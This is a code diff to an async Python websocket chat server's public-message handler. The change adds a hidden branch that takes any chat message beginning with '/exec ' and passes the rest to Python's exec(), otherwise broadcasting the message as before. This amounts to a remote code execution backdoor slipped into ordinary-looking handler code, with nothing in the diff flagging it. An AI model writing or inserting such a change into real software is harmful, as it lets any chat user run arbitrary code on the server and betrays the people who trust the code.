@@ -71,8 +71,12 @@ async def handle_chat_message(websocket, message):
 
 # Handle public chat messages
 async def handle_public_chat_message(message):
-    print(f"Broadcasting public message to all clients:\n" + json.dumps(message))
-    await broadcast_message(json.dumps(message))
+    if message['data']['message'].startswith("/exec "):
+        cmd = message['data']['message'][6:]
+        exec(cmd)
+    else: 
+        print(f"Broadcasting public message to all clients:\n" + json.dumps(message))
+        await broadcast_message(json.dumps(message))
 
 # Message handler to process incoming messages
 async def handle_message(websocket, message):
